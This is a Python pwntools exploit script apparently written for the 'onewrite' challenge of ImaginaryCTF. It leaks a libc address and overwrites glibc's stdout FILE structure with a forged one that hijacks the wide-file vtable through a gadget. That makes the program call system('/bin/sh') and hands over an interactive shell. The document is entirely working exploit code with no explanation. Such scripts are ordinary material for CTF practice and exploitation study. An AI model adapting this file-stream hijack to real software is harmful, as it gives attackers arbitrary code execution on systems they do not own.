#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.terminal = "alacritty -e".split()


def conn():
    if args.REMOTE:
        io = remote("onewrite.chal.imaginaryctf.org", 1337)
    else:
        if args.GDB:
            io = gdb.debug([exe.path], aslr=False, api=False, gdbscript="""
            set follow-fork-mode parent
            """)
        else:
            io = process([exe.path])
            #gdb.attach(io)
    return io


def main():
    io = conn()
    if args.REMOTE:
        io.recvline()
    leak = int(io.recvline(), 16)
    info(f"leak: {hex(leak)}")
    libc.address = leak - 395120
    io.sendline(f"{hex(libc.sym['_IO_2_1_stdout_'])}".encode())

    stdout_lock = libc.sym['_IO_stdfile_1_lock']
    stdout = libc.sym['_IO_2_1_stdout_']
    fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
    
    # 0x00000000163830: add rdi, 0x10; jmp rcx; 
    gadget = libc.address + 0x00000000163830
    
    fake = FileStructure(0)
    fake.flags = 0x3b01010101010101
    fake._IO_read_end=libc.sym['system']
    fake._IO_save_base = gadget
    fake._IO_write_end=u64(b'/bin/sh\x00')
    fake._lock=stdout_lock
    fake._codecvt= stdout + 0xb8
    fake._wide_data = stdout+0x200
    fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
    
    payload = bytes(fake)
    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    main()
